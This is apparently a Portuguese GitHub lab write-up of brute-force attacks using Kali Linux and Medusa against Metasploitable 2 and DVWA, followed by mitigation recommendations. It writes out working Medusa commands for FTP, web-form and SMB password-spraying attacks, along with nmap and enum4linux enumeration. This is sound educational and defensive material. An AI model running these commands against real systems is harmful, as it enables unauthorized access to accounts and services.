🔐 Laboratório de Segurança – Ataques de Força Bruta com Kali Linux e Medusa
📌 Visão Geral

Este projeto consiste na implementação de um laboratório controlado para simulação de ataques de força bruta em múltiplos serviços, utilizando Kali Linux, Medusa e ambientes vulneráveis como Metasploitable 2 e DVWA.

O foco é demonstrar, na prática, conhecimentos em segurança ofensiva, identificação de vulnerabilidades e aplicação de medidas de mitigação, com abordagem estruturada e orientada a boas práticas.

🎯 Objetivos do Projeto
Simular ataques de força bruta em serviços reais (FTP, Web e SMB)
Compreender o funcionamento de mecanismos de autenticação sob ataque
Identificar vulnerabilidades relacionadas a credenciais fracas
Utilizar ferramentas de pentest em ambiente controlado
Documentar evidências técnicas de forma clara e organizada
Propor medidas de mitigação baseadas em boas práticas de segurança
🧪 Configuração do Ambiente

O ambiente foi configurado com duas máquinas virtuais (Kali Linux e Metasploitable 2) utilizando rede host-only no VirtualBox.

Essa configuração garante isolamento do ambiente, evitando exposição externa — fator essencial ao trabalhar com sistemas propositalmente vulneráveis.

Além disso, a rede interna facilita a comunicação entre as máquinas durante os testes.

🌐 Teste de Conectividade

Foi realizado teste inicial de conectividade entre as máquinas:

ping -c 3 <IP_ALVO>

O uso do parâmetro -c 3 permite validar a comunicação de forma objetiva, enviando um número limitado de pacotes.
<img width="1280" height="653" alt="ping entre as duas maquinas" src="https://github.com/user-attachments/assets/e901a309-41c8-4d25-a987-a0039c68efee" />


🔎 Enumeração com Nmap

A enumeração de serviços foi realizada com:

nmap -sV -p 21,22,80,443 <IP_ALVO>

O objetivo foi identificar serviços ativos e suas versões.

Portas analisadas:

21 (FTP): autenticação e transferência de arquivos
22 (SSH): acesso remoto seguro
80 (HTTP): comunicação web não criptografada
443 (HTTPS): comunicação web segura

Os resultados indicaram serviços ativos e presença de versões desatualizadas.
<img width="1280" height="653" alt="enumeracao com nmap" src="https://github.com/user-attachments/assets/9a5d79fb-c04d-44d7-b576-7ec0d672a7a7" />


📂 Validação do Serviço FTP

Validação do serviço FTP:

ftp <IP_ALVO>

O serviço estava ativo e exigia autenticação, indicando potencial para ataque de força bruta.
<img width="1280" height="653" alt="tentativa de comunicacao ftp" src="https://github.com/user-attachments/assets/4a5783b0-fb12-44fd-88af-9997ccdd1040" />


🔑 Ataque de Força Bruta – FTP

Criação de wordlists simples:

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

Execução do ataque:

medusa -h <IP_ALVO> -U users.txt -P pass.txt -M ftp -t 6

O teste resultou na identificação de credenciais válidas e acesso ao serviço FTP.
<img width="1366" height="653" alt="criacao de wordlists 2" src="https://github.com/user-attachments/assets/f11d85ac-b678-4435-9f7d-923425653d33" />
<img width="1280" height="653" alt="ataque 1 de forca bruta" src="https://github.com/user-attachments/assets/cd3decb4-9a3f-4244-8710-aa96dfd619da" />
<img width="1280" height="653" alt="ftp conectado apso descobrir a senha" src="https://github.com/user-attachments/assets/bd29b44c-ea6f-4202-80ab-c3c6b4e724a5" />


🌐 Testes em Aplicação Web (DVWA)

A aplicação DVWA foi acessada via navegador.

Com uso do DevTools (F12), foi analisada a estrutura do formulário de login, incluindo parâmetros e comportamento da requisição.

🔁 Ataque de Força Bruta – Formulário Web
<img width="1366" height="653" alt="como se conporta formulario dvwa" src="https://github.com/user-attachments/assets/a51dd902-8415-4c85-a528-eb8f6a5c525a" />
<img width="1280" height="653" alt="teste conectividade de internet" src="https://github.com/user-attachments/assets/55c423dc-6294-411c-8a8b-7fbe4eddd2c0" />


Criação de wordlists ampliadas:

echo -e "user\nusers\nmsfadmin\nadmin\nnadmin\nroot\nadm" > users.txt
echo -e "123456\npassword\nadmin\nmsfadmin\nqwerty\nroot\nmsfroot" > pass.txt
<img width="1366" height="653" alt="criacao de wordlists 2" src="https://github.com/user-attachments/assets/592d2198-9225-4b0e-a419-dfea81403325" />


Execução do ataque:

medusa -h <IP_ALVO> -U users.txt -P pass.txt \
-M http \
-m PAGE:"/dvwa/login.php/" \
-m FORM:"username=^USER^&password=^PASS^&Login=Login" \
-m FAIL:"Login failed" \
-t 6
<img width="1366" height="653" alt="versao detalhada ataque forca bruta medusa" src="https://github.com/user-attachments/assets/b8bddebc-176f-49a3-852c-3f5b5ff564e5" />

Foi possível identificar credenciais válidas e acessar a aplicação.
<img width="1366" height="653" alt="credenciais" src="https://github.com/user-attachments/assets/8793a1bc-9922-4d35-acb9-f0b49cf9aeeb" />


👥 Enumeração de Usuários – SMB

Enumeração realizada com:

enum4linux -a <IP_ALVO> | tee enum4_output.txt
<img width="1366" height="653" alt="emuneracao de sevidor mal configurado 1" src="https://github.com/user-attachments/assets/5f8080df-53aa-4ad6-bd6f-3c98f7e88f3c" />


A ferramenta permitiu coletar informações relevantes sobre usuários do sistema.

🎯 Password Spraying – SMB

Criação da wordlist de usuários:

echo -e "user\nmsfadmin\nservice" > smb_users.txt
<img width="1366" height="653" alt="woldlists para servidor mal configurado" src="https://github.com/user-attachments/assets/357485dd-a932-44fd-a10a-a0c670fc674b" />


Execução do ataque:

medusa -h <IP_ALVO> -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 -V

A técnica permitiu identificar credenciais válidas, incluindo acesso com privilégios elevados.
<img width="1366" height="653" alt="sprayne em servidor mal configurado" src="https://github.com/user-attachments/assets/1225f425-eeff-4334-b149-65d4589f3075" />


📁 Validação de Acesso

Validação via SMB:

smbclient -L //<IP_ALVO> -U msfadmin

Confirmando acesso aos recursos compartilhados.
<img width="1366" height="653" alt="autentificacao smbcleinet" src="https://github.com/user-attachments/assets/6fe17b87-5d5f-45ec-8370-6fec949a0511" />


📊 Resultados Obtidos
Identificação de credenciais fracas
Acesso não autorizado a serviços
Serviços expostos com configurações inseguras
Falta de mecanismos de proteção contra múltiplas tentativas
🛡️ Recomendações de Mitigação
Implementação de políticas de senha forte
Bloqueio de conta após tentativas inválidas
Uso de autenticação multifator (MFA)
Monitoramento de logs de autenticação
Restrição de acesso a serviços sensíveis
Implementação de proteção contra automação (ex: CAPTCHA)
📚 Competências Demonstradas
Pentest (segurança ofensiva)
Enumeração e análise de serviços
Exploração de vulnerabilidades de autenticação
Uso de ferramentas como Medusa e Nmap
Documentação técnica estruturada

⚠️ Considerações Éticas

Este projeto foi realizado em ambiente controlado, com finalidade educacional.

Nenhum sistema real foi testado sem autorização.

🚀 Próximos Passos
Testes em ambientes como Kioptrix
Simulações em cenário black box
Exploração completa até acesso root
Ampliação do uso de ferramentas de segurança
